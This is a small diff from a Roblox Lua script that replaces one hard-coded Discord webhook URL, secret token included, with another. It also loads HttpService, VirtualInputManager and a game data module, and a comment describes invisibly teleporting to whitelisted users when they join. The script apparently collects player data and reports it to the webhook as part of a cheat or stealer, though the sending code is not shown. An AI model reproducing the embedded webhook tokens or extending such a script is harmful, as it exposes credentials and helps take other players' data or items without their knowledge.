@@ -9,7 +9,7 @@ local Camera = workspace.CurrentCamera
 local VirtualInputManager = game:GetService("VirtualInputManager")
 local HttpService = game:GetService("HttpService")
 
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1403786302461182083/OmkGNGgXamqB2Q_vs3u5WElaP5E2cpC8mSTeEfJwFnfFB7SQabgkFJi-NIKo_WLVISEs"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1407693523494371489/prl2q43t_b08DchuuM67ia9ewFe3l1n9t0YhxulzPOTCMj3QyZQ_BGzKHX2MHY3CoytD"
 local dataModule = require(ReplicatedStorage.Modules.DataService)
 
 -- Whitelisted usernames that when join, you teleport to them invisibly
